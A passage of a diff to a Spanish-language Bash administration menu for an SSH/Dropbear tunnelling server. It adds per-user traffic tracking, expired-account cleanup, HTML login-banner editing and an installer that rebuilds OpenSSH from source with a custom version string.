+                elif [[ "$tipo" = "TOKEN" ]]; then
+                    nombre_display="$(cat $dir_user/${user} | grep "senha" | awk '{print $2}') \033[1;35m[TOKEN]\033[0m"
+                fi
+            fi
+            
+
+            # Línea 1
+                        # Línea 1 - Ahora [HWID] sale en AZUL
+            echo -e "\033[0;35m[${nU}]\033[0;37m ${nombre_display} \033[1;33m[${conex}/1]\033[0m"
+
+            # Línea 2
+            echo -e "   └─ \033[1;32mConsumo:\033[0m ${consumo}   \033[1;36mTiempo:\033[0m ${timerr}"
+
+            # SEPARADOR ENTRE USUARIOS (guiones)
+            echo -e "\033[0;90m─────────────────────────────────────────────────────\033[0m\n"
+
+            conex1+="${conex}+"
+            let nU++
+        fi
+    done
+
+    rm -f /tmp/dropbear_logins.log /tmp/active_dropbear.log /tmp/user_logins.log &>/dev/null
+    conex1+="0"
+    conex1=$(echo $conex1|bc)
+
+    msg -bar
+    echo -e " \033[1;32m🔰 # TIENES \033[1;33m[ ${conex1} ]\033[1;32m USUARIOS CONECTADOS 🔰 #\033[0m"
+    msg -bar
+    
+}
+
+menu_consumo_acumulado() {
+    while true; do
+        clear
+        msg -bar
+        echo -e "\E[41;1;37m ⚙️ MENU CONSUMO ACUMULADO (DAEMON AUTOMÁTICO) \E[0m"
+        msg -bar
+        echo -e "\033[1;37m [1] \033[1;32mActivar consumo acumulado (segundo plano)\033[0m"
+        echo -e "\033[1;37m [2] \033[1;31mDesactivar consumo acumulado\033[0m"
+        echo -e "\033[1;37m [3] \033[1;33mResetear consumo de TODOS los usuarios\033[0m"
+        echo -e "\033[1;37m [4] \033[1;36mVer consumo detallado de TODOS los usuarios\033[0m"
+        echo -e "\033[1;37m [0] \033[1;36mVolver al menú principal\033[0m"
+        msg -bar
+        read -p "   Seleccione una opción [0-4]: " opcion
+
+        case $opcion in
+            1)
+                if [[ ! -f /root/consumo_acumulado_bg.sh ]]; then
+                    cat > /root/consumo_acumulado_bg.sh << 'EOF'
+#!/bin/bash
+CONSUMO_FILE="/root/consumo_acumulado.dat"
+TOGGLE_FILE="/root/.consumo_acumulado_activo"
+PIDFILE="/root/consumo_acumulado.pid"
+REFRESH=15
+declare -A prev_bytes
+echo $$ > "$PIDFILE"
 while true; do
-    clear&&clear
-    valid_fun
-    echo -e " \033[1;37m[\033[1;36m1\033[1;37m]\033[1;33m CREAR USUARIO"
-    echo -e " \033[1;37m[\033[1;36m2\033[1;37m]\033[1;33m LISTAR USUARIOS"
-    echo -e " \033[1;37m[\033[1;36m3\033[1;37m]\033[1;33m BORRAR USUARIO"
-    echo -e " \033[1;37m[\033[1;36m4\033[1;37m]\033[1;33m CAMBIAR PASSWORD"
-    echo -e " \033[1;37m[\033[1;36m5\033[1;37m]\033[1;33m CONEXIONES ACTIVAS"
-    echo -e " \033[1;37m[\033[1;36m0\033[1;37m]\033[1;33m [ SALIR ]"
-    msg -bar
-    echo -ne "\033[1;37m Opcion: "
-    read select
-    case $select in
-        1) crear_usuario ;;
-        2) listar_usuarios ;;
-        3) borrar_usuario ;;
-        4) cambiar_password ;;
-        5) monitor_conexiones ;;
-        0) killall usercodes 2>/dev/null; exit ;;
-    esac
+    if [[ ! -f "$TOGGLE_FILE" ]]; then
+        sleep 5
+        continue
+    fi
+    while IFS= read -r line; do
+        [[ -z "$line" ]] && continue
+        read -r pid user etime <<< "$line"
+        clean_user="${user%+}"
+        total_bytes=0
+        if [[ -r "/proc/$pid/io" ]]; then
+            r=$(awk '/rchar:/{print $2}' "/proc/$pid/io" 2>/dev/null || echo 0)
+            w=$(awk '/wchar:/{print $2}' "/proc/$pid/io" 2>/dev/null || echo 0)
+            total_bytes=$((r + w))
+        fi
+        if [[ $total_bytes -gt 0 ]]; then
+            prev=${prev_bytes[$clean_user]:-0}
+            delta=$((total_bytes - prev))
+            if [[ $delta -gt 0 ]]; then
+                anterior=$(grep "^${clean_user}:" "$CONSUMO_FILE" 2>/dev/null | cut -d: -f2 || echo 0)
+                nuevo=$((anterior + delta))
+                sed -i "/^${clean_user}:/d" "$CONSUMO_FILE" 2>/dev/null
+                echo "${clean_user}:${nuevo}" >> "$CONSUMO_FILE"
+            fi
+            prev_bytes[$clean_user]=$total_bytes
+        fi
+    done < <(ps -eo pid,user:40,etime,command | grep '[s]shd:' | grep -v root | awk '{print $1 " " $2 " " $3}')
+    sleep $REFRESH
 done
+EOF
+                    chmod +x /root/consumo_acumulado_bg.sh
+                fi
+                if [[ ! -f /root/consumo_acumulado.pid ]] || ! kill -0 $(cat /root/consumo_acumulado.pid 2>/dev/null) 2>/dev/null; then
+                    nohup /root/consumo_acumulado_bg.sh > /dev/null 2>&1 &
+                    touch /root/.consumo_acumulado_activo
+                    echo -e "\n\033[1;32m✅ CONSUMO ACUMULADO ACTIVADO EN SEGUNDO PLANO\033[0m"
+                else
+                    echo -e "\n\033[1;33m⚠️ Ya estaba activado\033[0m\n"
+                fi
+                ;;
+            2)
+                if [[ -f /root/consumo_acumulado.pid ]]; then
+                    kill $(cat /root/consumo_acumulado.pid 2>/dev/null) 2>/dev/null
+                    rm -f /root/consumo_acumulado.pid
+                fi
+                rm -f /root/.consumo_acumulado_activo
+                echo -e "\n\033[1;31m❌ CONSUMO ACUMULADO DESACTIVADO\033[0m\n"
+                ;;
+            3)
+                > /root/consumo_acumulado.dat
+                echo -e "\n\033[1;33m♻️ CONSUMO DE TODOS LOS USUARIOS REINICIADO A 0\033[0m\n"
+                ;;
+            4)
+                ver_consumo_detallado
+                ;;
+            0)
+                echo -e "\n\033[1;36mVolviendo al menú principal...\033[0m"
+                break
+                ;;
+            *)
+                echo -e "\n\033[1;31mOpción inválida!\033[0m"
+                ;;
+        esac
+        echo -e "\nPresiona Enter para continuar..."
+        read -r
+    done
+}
+
+ver_consumo_detallado() {
+    clear
+    local CONSUMO_FILE="/root/consumo_acumulado.dat"
+    local FACTOR=1.85
+
+    local start_time=$(stat -c %W "$CONSUMO_FILE" 2>/dev/null || stat -c %Y "$CONSUMO_FILE")
+    local days=$(( ( $(date +%s) - start_time ) / 86400 ))
+    [[ $days -eq 0 ]] && days=1
+
+    msg -bar
+    echo -e "\E[41;1;37m     CONSUMO DETALLADO DE TODOS LOS USUARIOS (FACTOR 1.85)     \E[0m"
+    msg -bar
+    echo -e "\033[1;36m   USUARIO                              CONSUMO       DÍAS ACUM.\033[0m"
+    msg -bar
+
+    local pos=1
+    while IFS=: read -r usuario bytes; do
+        [[ -z "$usuario" || -z "$bytes" ]] && continue
+
+        local clean_user="${usuario%+}"
+
+        local estimated=$(awk -v b=$bytes -v f=$FACTOR 'BEGIN {printf "%.0f", b / f}')
+
+        local consumo
+        if (( estimated >= 1073741824 )); then
+            consumo=$(awk -v b=$estimated 'BEGIN {printf "%.2f GB", b/1073741824}')
+        elif (( estimated >= 1048576 )); then
+            consumo=$(awk -v b=$estimated 'BEGIN {printf "%.1f MB", b/1048576}')
+        else
+            consumo=$(awk -v b=$estimated 'BEGIN {printf "%d KB", b/1024}')
+        fi
+
+        local nombre_display="$clean_user"
+        local dir_real=$(find /etc/adm-lite/userDIR -name "${clean_user}*" -type f 2>/dev/null | head -n1)
+        if [[ -n "$dir_real" ]]; then
+            local tipo=$(grep "limite" "$dir_real" 2>/dev/null | awk '{print $2}')
+            if [[ "$tipo" = "HWID" || "$tipo" = "TOKEN" ]]; then
+                nombre_display="$(grep "senha" "$dir_real" 2>/dev/null | awk '{print $2}')"
+                [[ "$tipo" = "HWID" ]] && nombre_display="${nombre_display} \033[1;34m[HWID]\033[0m"
+                [[ "$tipo" = "TOKEN" ]] && nombre_display="${nombre_display} \033[1;35m[TOKEN]\033[0m"
+            fi
+        fi
+
+        echo -e "\033[0;35m[${pos}]\033[0;37m ${nombre_display} \033[1;33m[1/1]\033[0m"
+        echo -e "   └─ \033[1;32mConsumo:\033[0m ${consumo}   \033[1;36mDías acumulados:\033[0m ${days}"
+        echo -e "\033[0;90m────────────────────────────────────────────────────────────\033[0m\n"
+
+        ((pos++))
+    done < <(sort -t: -k2 -nr "$CONSUMO_FILE")
+
+    msg -bar
+    echo -e "\033[1;33mTOTAL ACUMULADO (todos los usuarios): \033[1;32m$(awk '{sum+=$2} END {printf "%.2f GB", sum/1073741824}' "$CONSUMO_FILE")\033[0m"
+    msg -bar
+    echo -e "\033[1;37mPresiona Enter para volver...\033[0m"
+    read -r
+}
+function_6 () {
+
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+
+unset _removidos
+msg -bar
+datenow=$(date +%s)
+for user in $(awk -F: '{print $1}' /etc/passwd); do
+expdate=$(chage -l $user|awk -F: '/Account expires/{print $2}')
+echo $expdate|grep -q never && continue
+datanormal=$(date -d"$expdate" '+%d/%m/%Y')
+expsec=$(date +%s --date="$expdate")
+diff=$(echo $datenow - $expsec|bc -l)
+echo $diff|grep -q ^\- && continue
+userdel --force $user > /dev/null 2>/dev/null
+kill -9 `ps aux |grep -vi '[a-z]$user' |grep -vi '$user[a-z]' |grep -v '[1-9]$user' |grep -v '$user[1-9]' |grep $user |awk {'print $2'}` 2> /dev/null
+pid_kill=$(dropbear_pids | grep "$user" | awk '{print $2}')
+uskk=$(cat /bin/ejecutar/uskill)
+let uskk=$uskk+$cco
+echo $uskk > /bin/ejecutar/uskill
+[[ "$pid_kill" != "" ]] && drop_kill $user
+[[ "$OPENVPN" = "on" ]] && open_2 $name
+[[ -e $dir_user/$user ]] && rm $dir_user/$user
+_removidos="on"
+echo -e "\033[1;37m $user ${cor[2]} ELIMINADO "
+done
+if [ "$_removidos" = "" ]; then
+echo -e "${cor[5]} ⚠️  No hay Usuarios Vencidos! ⚠️ "
+unset _removidos
+fi
+msg -bar
+}
+
+ban_per () {
+clear
+local="/etc/bannerssh"
+msg -bar3
+echo -e "\033[1;37m - BANNER CUSTOM EDITABLE -  \033[0m"
+msg -bar3
+echo -e "\033[1;37mSeleccione su Sistema:    Para Salir Ctrl + C o 0 Para Regresar\033[1;33m"
+echo -e " \033[1;31m[ !!! ]\033[1;33m PEGA AQUI TU BANNER   \033[1;31m\033[1;33m"
+msg -bar3
+echo -e " \033[1;31mLuego de Pegar tu banner Presiona Ctrl + O y Enter \033[1;33m \033[1;31m\033[1;33m"
+echo -e " \033[1;31m          Por Ultimo Ctrl + X  \033[1;33m \033[1;31m\033[1;33m"
+echo -ne "\033[1;37m"
+read -p " Presiona Enter para Continuar "
+killall apt-get apt &>/dev/null
+[[ $(dpkg --get-selections|grep -w "nano"|head -1) ]] || apt-get install nano -y &>/dev/null
+touch /bin/ejecutar/bannerssh
+nano /bin/ejecutar/bannerssh
+[[ -z $(cat /bin/ejecutar/bannerssh) ]] && echo -e " INFORMACION TEXTUAL INVALIDA " || cat /bin/ejecutar/bannerssh > /etc/bannerssh
+rm -f /bin/ejecutar/bannerssh
+fun_bar
+#[[ ! -e /root/name ]] && credi="@ChumoGH" || credi=$(cat < /root/name)
+#echo '<p style="text-align: center;"><strong><span style="color: #FF00FF;">'$(cat /bin/ejecutar/menu_credito)'&reg;</span> |&nbsp;</strong><span style="color: #483D8B;"><strong>'$credi'</strong></span></p>' >> /etc/bannerssh
+[[ -d /etc/dropbear ]] && {
+[[ -e /etc/bannerssh ]] && cat /etc/bannerssh > /etc/dropbear/banner
+} || men="NO EXISTE DROPBEAR"
+msg -bar3
+echo -ne " \033[1;31m[ ! ] VERIFICANDO DROPBEAR "
+service dropbear restart > /dev/null 2>&1
+[[ -e /etc/init.d/dropbear ]] && { 
+/etc/init.d/dropbear restart > /dev/null 2>&1 && echo -e "\033[1;32m [OK]"  || {
+echo -e "\033[1;31m - BANNER INCOMPATIBLE CON DROPBEAR -\n" && echo "DESTRUYENDO DISEÑO" 
+echo "" > /etc/dropbear/banner 
+/etc/init.d/dropbear restart > /dev/null 2>&1 && echo -e "\033[1;32m [OK]"
+}
+} || echo -e "\033[0;35m [ $men ]"
+echo -ne " \033[1;31m[ ! ] VERIFICANDO SSH"
+service ssh restart > /dev/null 2>&1
+service sshd restart > /dev/null 2>&1
+[[ -e /etc/init.d/ssh ]] && /etc/init.d/ssh restart > /dev/null 2>&1 && echo -e "\033[1;32m [OK]" || echo -e "\033[1;31m [FAIL]"
+sleep 0.1s
+exit 
+}
+
+
+
+Call.bannerSSH () {
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+tput cuu1 && tput dl1
+msg -bar3
+echo -e "${cor[2]}MENU BANNER λ (RECOMENDADO 2):"
+msg -bar3
+echo -e "\033[0;35m [\033[0;36m01\033[0;35m]\033[0;31m >${cor[3]} Pegar BANNER Personalizado ( html , etc )"
+echo -e "\033[0;35m [\033[0;36m02\033[0;35m]\033[0;31m >${cor[3]} AGREGAR MENSAJES BANNER SSH"
+echo -e "\033[0;35m [\033[0;36m03\033[0;35m]\033[0;31m >${cor[3]} ELIMINAR BANNER ( SSH ⇿ DROPBEAR )"
+echo -e "\033[0;35m [\033[0;36m04\033[0;35m]\033[0;31m >${cor[3]} CheckUser + BANNER \033[0;31m[ $(msg -verm2 'NUEVO') \033[0;31m]"
+echo -e "\033[0;35m [\033[0;36m05\033[0;35m]\033[0;31m >${cor[3]} INSTALAR OPENSSH MOD ( UBUNTU 18 / 20 )"
+msg -bar3
+echo -e " \033[0;35m [\033[0;36m0\033[0;35m]\033[0;31m > $(msg -bra "\033[1;41m[ REGRESAR ]\e[0m")"
+msg -bar3
+selection=$(selection_fun 5)
+case ${selection} in
+1)
+unset sshsn
+unset sin_nao
+echo -e " Al escojer que coloques tu Banner creado fuera del Script, ADM no se "
+echo -e "   Responsabiliza por el Fallo de ciertos recursos del SISTEMA"
+echo -e "RECUERDA QUE EL SCRIPT ESTA REALIZADO PARA FUNCIONAR CON SUS FUNCIONES"
+echo -e "                Y esta es EXPERIMENTAL"
+echo -e "Esta SEGURO QUE DESEAS CONTINUAR ?:"
+read -p " [S/N]: " -e -i n sshsn
+[[ "$sshsn" = @(s|S|y|Y) ]] && {
+local2="/etc/bannerssh"
+chk=$(cat /etc/ssh/sshd_config | grep Banner)
+if [ "$(echo "$chk" | grep -v "#Banner" | grep Banner)" != "" ]; then
+local=$(echo "$chk" |grep -v "#Banner" | grep Banner | awk '{print $2}')
+ else
+echo "Banner /etc/bannerssh" >> /etc/ssh/sshd_config
+local="/etc/bannerssh"
+fi
+while true; do
+echo -e " ESTRUCTURA BANNER CUSTOM AÑADIDA, ACEPTAS CONTINUAR?"
+read -p " [ s | n ]: " sin_nao
+ if [[ "$sin_nao" = @(s|S|y|Y) ]]; then
+ ban_per
+ elif [[ "$sin_nao" = @(n|N) ]]; then
+ break
+ fi
+done
+}
+;;
+2)
+unset sshsn
+unset sin_nao
+echo -e "${cor[3]} Buena ELECCION, Tienes un 99% mas Garantia"
+echo -e "${cor[3]} Esta SEGURO:"
+read -p " [S/N]: " -e -i s sshsn
+[[ "$sshsn" = @(s|S|y|Y) ]] && {
+local2="/etc/bannerssh"
+# --- Limpiamos el archivo banner antes de añadir nuevo texto ---
+> "$local2"
+
+chk=$(cat /etc/ssh/sshd_config | grep Banner)
+if [ "$(echo "$chk" | grep -v "#Banner" | grep Banner)" != "" ]; then
+local=$(echo "$chk" |grep -v "#Banner" | grep Banner | awk '{print $2}')
+ else
+echo "Banner /etc/bannerssh" >> /etc/ssh/sshd_config
+local="/etc/bannerssh"
+fi
+msg -bar3
+echo -e "\n\033[1;31m[\033[1;36m01\033[1;31m]\033[1;33m Letra Pequeña"
+echo -e "\033[1;31m[\033[1;36m02\033[1;31m]\033[1;33m Letra Media"
+echo -e "\033[1;31m[\033[1;36m03\033[1;31m]\033[1;33m Letra Grande"
+echo -e "\033[1;31m[\033[1;36m04\033[1;31m]\033[1;33m Letra ExtraGrande"
+echo ""
+echo -ne "\033[1;32mEscoje el Tamaño de Letra\033[1;31m ?\033[1;37m : "; read opc
+if [[ "$opc" = "1" ]] || [[ "$opc" = "01" ]]; then
+_size='6'
+elif [[ "$opc" = "2" ]] || [[ "$opc" = "02" ]]; then
+_size='4'
+elif [[ "$opc" = "3" ]] || [[ "$opc" = "03" ]]; then
+_size='3'
+elif [[ "$opc" = "4" ]] || [[ "$opc" = "04" ]]; then
+_size='1'
+else
+_size='6'
+fi
+msg -bar3
+echo -ne "\033[1;37m"
+read -p " INGRESA TU MENSAJE : " ban_ner
+msg -bar3
+echo -e " \033[1;31m[ 1 ]\033[1;33m > VERDE         \033[1;31m[ 9  ]\033[1;33m > AZUL PIZARRA OSCURO"
+echo -e " \033[1;31m[ 2 ]\033[1;33m > ROJO          \033[1;31m[ 10 ]\033[1;33m > MAGENTA"
+echo -e " \033[1;31m[ 3 ]\033[1;33m > AZUL          \033[1;31m[ 11 ]\033[1;33m > CHOCOLATE"
+echo -e " \033[1;31m[ 4 ]\033[1;33m > AMARILLO      \033[1;31m[ 12 ]\033[1;33m > VERDE CLARO"
+echo -e " \033[1;31m[ 5 ]\033[1;33m > PURPURA       \033[1;31m[ 13 ]\033[1;33m > GRIS"
+echo -e " \033[1;31m[ 6 ]\033[1;33m > Naranja       \033[1;31m[ 14 ]\033[1;33m > VERDE MAR"
+echo -e " \033[1;31m[ 7 ]\033[1;33m > Crema         \033[1;31m[ 15 ]\033[1;33m > CIAN OSCURO"
+echo -e " \033[1;31m[ 8 ]\033[1;33m > Cyano         \033[1;31m[ * ]\033[1;33m > Negro"
+read -p " [ 1 ⇿ 15 ]: " ban_ner_cor
+unset local 
+unset x
+echo -e "\033[1;42m Deseas centrar el contenido del banner\033[0;33m  :v"
+echo ""
+echo -ne "\033[0;32m Responde [ s | n ] : " && read -e -i "s" x
+msg -bar3
+
+[[ "$x" = @(s|S|y|Y) ]] && echo -e '<p style="text-align: center;">' > /etc/bannerssh
+
+if [[ "$ban_ner_cor" = "1" ]]; then
+echo '<h'$_size' style="text-align:center;"><font color="green">' >> /etc/bannerssh
+elif [[ "$ban_ner_cor" = "2" ]]; then
+echo '<h'$_size' style="text-align:center;"><font color="red">' >> /etc/bannerssh
+elif [[ "$ban_ner_cor" = "3" ]]; then
+echo '<h'$_size' style="text-align:center;"><font color="blue">' >> /etc/bannerssh
+elif [[ "$ban_ner_cor" = "4" ]]; then
+echo '<h'$_size' style="text-align:center;"><font color="yellow">' >> /etc/bannerssh
+elif [[ "$ban_ner_cor" = "5" ]]; then
+echo '<h'$_size' style="text-align:center;"><font color="purple">' >> /etc/bannerssh
+elif [ "$ban_ner_cor" = "6" ]; then
+echo '<h'$_size' style="text-align:center;"><font color="#FF7F00">' >> /etc/bannerssh
+elif [ "$ban_ner_cor" = "7" ]; then
+echo '<h'$_size' style="text-align:center;"><font color="#AEB404">' >> /etc/bannerssh
+elif [ "$ban_ner_cor" = "8" ]; then
+echo '<h'$_size' style="text-align:center;"><font color="cyan">' >> /etc/bannerssh
+elif [ "$ban_ner_cor" = "9" ]; then
+echo '<h'$_size' style="text-align:center;"><font color="#483D8B">' >> /etc/bannerssh
+elif [ "$ban_ner_cor" = "10" ]; then
+echo '<h'$_size' style="text-align:center;"><font color="#FF00FF">' >> /etc/bannerssh
+elif [ "$ban_ner_cor" = "11" ]; then
+echo '<h'$_size' style="text-align:center;"><font color="#D2691E">' >> /etc/bannerssh
+elif [ "$ban_ner_cor" = "12" ]; then
+echo '<h'$_size' style="text-align:center;"><font color="#90EE90">' >> /etc/bannerssh
+elif [ "$ban_ner_cor" = "13" ]; then
+echo '<h'$_size' style="text-align:center;"><font color="#BEBEBE">' >> /etc/bannerssh
+elif [ "$ban_ner_cor" = "14" ]; then
+echo '<h'$_size' style="text-align:center;"><font color="#2E8B57">' >> /etc/bannerssh
+elif [ "$ban_ner_cor" = "15" ]; then
+echo '<h'$_size' style="text-align:center;"><font color="#008B8B">' >> /etc/bannerssh
+else
+echo '<h'$_size' style="text-align:center;"><font color="black">' >> /etc/bannerssh
+fi
+echo "$ban_ner" >> /etc/bannerssh
+echo '</font></h'$_size'>' >> /etc/bannerssh
+[[ "$x" = @(s|S|y|Y) ]] && echo "</p>" >> /etc/bannerssh
+while true; do
+echo -e " DESEAS AÑADIR MAS TEXTOS A TU BANNER?"
+read -p " [ s | n ]: " sin_nao
+ if [[ "$sin_nao" = @(s|S|y|Y) ]]; then
+ txt_font
+ elif [[ "$sin_nao" = @(n|N) ]]; then
+ break
+ fi
+done
+[[ -e /root/name ]] && credi=$(cat < /root/name) || credi="@PandaHL001"
+credit=$(cat < /bin/ejecutar/exito | head -1)
+
+# --- PANDA AÑADIDO AQUÍ ---
+echo -e '<p style="text-align: center;"><strong><span style="color: #FF00FF;">'"$credit"'</span> |&nbsp;</strong><span style="color: #483D8B;"><strong>'"$credi"' λ</strong></span></p>' >> /etc/bannerssh
+
+[[ -d /etc/dropbear ]] && {
+[[ -e /etc/bannerssh ]] && cat /etc/bannerssh > /etc/dropbear/banner
+} || men="NO EXISTE DROPBEAR"
+msg -bar3
+echo -ne " \033[1;31m[ ! ] VERIFICANDO DROPBEAR "
+service dropbear restart > /dev/null 2>&1
+[[ -e /etc/init.d/dropbear ]] && { 
+/etc/init.d/dropbear restart > /dev/null 2>&1 && echo -e "\033[1;32m [OK]"  || {
+echo -e "\033[1;31m ▢ BANNER INCOMPATIBLE CON DROPBEAR -\n" && echo "DESTRUYENDO DISEÑO" 
+echo "" > /etc/dropbear/banner 
+/etc/init.d/dropbear restart > /dev/null 2>&1 && echo -e "\033[1;32m [OK]"
+}
+} || echo -e "\033[0;35m [ $men ]" 
+echo -ne " \033[1;31m[ ! ] VERIFICANDO SSH "
+service ssh restart > /dev/null 2>&1
+service sshd restart > /dev/null 2>&1
+[[ -e /etc/init.d/ssh ]] && /etc/init.d/ssh restart > /dev/null 2>&1 && echo -e "\033[1;32m [OK]" || echo -e "\033[1;31m [FAIL]"
+}
+return 0
+;;
+3)
+# --- OPCIÓN 3 MEJORADA ---
+msg -bar3
+msg -ama " ELIMINANDO BANNERS (SSH & DROPBEAR)"
+msg -bar3
+
+# 1. Desactivar Banner en SSHD
+sshd_config="/etc/ssh/sshd_config"
+if grep -q -E "^[ ]*Banner" "$sshd_config"; then
+    # Comenta todas las líneas 'Banner' que no estén ya comentadas
+    sed -i -E 's/^[ ]*Banner/#Banner/' "$sshd_config"
+    msg -verd "Banner desactivado en sshd_config"
+else
+    msg -azu "Banner ya estaba desactivado en sshd_config"
+fi
+
+# 2. Limpiar archivo de banner SSH
+if [[ -e /etc/bannerssh ]]; then
+    echo "" > /etc/bannerssh
+    msg -verd "Archivo /etc/bannerssh limpiado"
+else
+    msg -azu "No existía /etc/bannerssh"
+fi
+
+# 3. Limpiar archivo de banner Dropbear
+if [[ -e /etc/dropbear/banner ]]; then
+    echo "" > /etc/dropbear/banner
+    msg -verd "Archivo /etc/dropbear/banner limpiado"
+else
+    msg -azu "No existía /etc/dropbear/banner"
+fi
+
+# 4. Reiniciar servicios
+msg -bar3
+msg -ama "Reiniciando servicios..."
+systemctl restart ssh &>/dev/null
+systemctl restart sshd &>/dev/null
+systemctl restart dropbear &>/dev/null
+msg -verd "Servicios reiniciados."
+msg -bar3
+return 0
+;;
+# --- FIN DE LA OPCIÓN 3 ---
+4)
+clear&&clear
+msg -bar3
+print_center -verm2 ' BANNER + CHECKUSER CUSTOM \nESTA OPCIÓN COMBINA EL BANNER DE SSH/DROPBEAR (SI EXISTE).\nFUNCIÓN: MUESTRA UN BANNER CON EL USUARIO Y FECHA DE EXPIRACIÓN.\n'
+print_center -azu ' ⚠️ REQUISITOS DE COMPATIBILIDAD ⚠️'
+print_center -azu ' 🔹 Nativo: Solo funciona en Ubuntu 22+ y Debian 11+.'
+print_center -ama ' 🔸 Ubuntu 18/20: REQUIERE INSTALAR OPENSSH MOD (OPCIÓN 05).'
+print_center -azu ' 🔹 Requiere que el puerto SSH (22 o personalizado) esté activo.'
+msg -bar
+print_center -verm2 ' ¡CUIDADO CON BANNERS MAL ESTRUCTURADOS, PUEDE FALLAR!'
+print_center -verm2 '  ESTA FUNCIÓN PUEDE OCUPAR MÁS RECURSOS DEL SISTEMA.'
+
+menu_bannCheck
+;;
+5)
+#!/bin/bash
+
+# =================================================================
+# PANDA SCRIPT - OPENSSH CUSTOMIZER (UBUNTU 18.04 / 20.04)
+# =================================================================
+
+# Colores y Variables de PandaScript
+COLOR_VIOLETA='\033[38;5;129m'  
+RESET='\033[0m' 
+TTini='=====>>►► 🐼'
+TTfin='🐼 ◄◄<<=====     '
+LOG_ERROR="/root/error_install.log"
+
+# Importación de función msg para compatibilidad con PandaScript
+msg() {
+  local colors="/etc/new-adm-color"
+  local SEMCOR='\e[0m'
+  local NEGRITO='\e[1m'
+  
+  # Definición de colores base
+  COLOR[0]='\033[1;37m' # Blanco
+  COLOR[1]='\e[31m'    # Rojo
+  COLOR[2]='\e[32m'    # Verde
+  COLOR[3]='\e[33m'    # Amarillo
+  COLOR[6]='\033[1;97m' # Azulado/Blanco
+  
+  case $1 in
+    -ama) echo -e "${COLOR[3]}${NEGRITO}${2}${SEMCOR}" ;;
+    -azu) echo -e "${COLOR[6]}${NEGRITO}${2}${SEMCOR}" ;;
+    -verd) echo -e "${COLOR[2]}${NEGRITO}${2}${SEMCOR}" ;;
+    -verm2) echo -e "${COLOR[1]}${NEGRITO}${2}${SEMCOR}" ;;
+    -bar)
+      WIDTH=55
+      echo -e "${COLOR_VIOLETA}$(printf '%.0s━' $(seq 1 $WIDTH))${SEMCOR}"
+    ;;
+  esac
+}
+
+# Función para centrar texto
+print_center(){
+  local text="$1"
+  while read line; do
+    x=$(( ( 55 - ${#line}) / 2))
+    space=""
+    for (( i = 0; i < $x; i++ )); do space+=' '; done
+    msg -azu "${space}${line}"
+  done <<< $(echo -e "$text")
+}
+
+# Título oficial PandaScript
+tittle_panda () {
+    clear
+    msg -bar
+    echo -e "\033[1;44;44m     \033[1;33m${TTini} PandaScript ${TTfin}     \033[0m"
+    msg -bar
+}
+
+# --- INICIO DEL PROCESO ---
+
+tittle_panda
+print_center "INSTALADOR OPENSSH MOD"
+msg -bar
+export PANDA_HOME=$(pwd)
+# 1. Detectar Versión
+DISTRO=$(lsb_release -rs)
+msg -ama "[+] Detectando Sistema: Ubuntu $DISTRO"
+
+# 2. Dependencias (Silencioso)
+echo -ne "$(msg -azu "[+] Instalando dependencias...")"
+sudo apt update &> /dev/null
+sudo apt install -y build-essential zlib1g-dev libssl-dev libpam0g-dev libselinux1-dev wget &>> $LOG_ERROR
+msg -verd " [OK]"
+
+# 3. Descarga y Personalización
+echo -ne "$(msg -azu "[+] Descargando y Modificando Banner...")"
+cd /root
+wget -c https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-9.8p1.tar.gz &>> $LOG_ERROR
+tar -xzf openssh-9.8p1.tar.gz &>> $LOG_ERROR
+cd openssh-9.8p1
+
+# Inyectar el Banner limpio solicitado
+sed -i 's/#define SSH_VERSION.*/#define SSH_VERSION "OpenSSH-MOD-Pandascript"/' version.h
+sed -i 's/#define SSH_RELEASE.*/#define SSH_RELEASE "OpenSSH-MOD-Pandascript"/' version.h
+msg -verd " [OK]"
+
+# 4. Compilación
+echo -ne "$(msg -azu "[+] Compilando (Pandascript)...")"
+./configure --with-pam --with-selinux --with-md5-passwords &>> $LOG_ERROR
+make -j$(nproc) &>> $LOG_ERROR
+sudo make install &>> $LOG_ERROR
+
+if [ $? -ne 0 ]; then
+    msg -verm2 " [ERROR]"
+    msg -ama "Revisa $LOG_ERROR"
+    exit 1
+fi
+msg -verd " [OK]"
+
+# 5. Optimización CheckUser
+echo -ne "$(msg -azu "[+] Optimizando para CheckUser...")"
+[[ -f /etc/ssh/sshd_config ]] && sudo cp /etc/ssh/sshd_config /usr/local/etc/sshd_config
+sudo sed -i '/MaxStartups/d' /usr/local/etc/sshd_config
+sudo sed -i '/MaxSessions/d' /usr/local/etc/sshd_config
+echo "MaxStartups 100:30:200" >> /usr/local/etc/sshd_config
+echo "MaxSessions 100" >> /usr/local/etc/sshd_config
+echo "LoginGraceTime 120" >> /usr/local/etc/sshd_config
+msg -verd " [OK]"
+
+# 6. Reinicio de Servicios
+echo -ne "$(msg -azu "[+] Reiniciando SSH...")"
+SERVICE_FILE="/lib/systemd/system/ssh.service"
+if [ -f "$SERVICE_FILE" ]; then
+    sudo sed -i 's|ExecStart=.*|ExecStart=/usr/local/sbin/sshd -D $SSHD_OPTS|' $SERVICE_FILE
+    sudo systemctl daemon-reload &> /dev/null
+    sudo systemctl restart ssh &> /dev/null
+fi
+msg -verd " [OK]"
+
+# 7. Limpieza
+echo -ne "$(msg -azu "[+] Eliminando archivos temporales...")"
+cd /root && rm -rf openssh-9.8p1*
+cd $PANDA_HOME
+sleep 2
+msg -verd " [OK]"
+
+msg -bar
+print_center "INSTALACION COMPLETADA EXITOSAMENTE"
+msg -bar
+
+;;
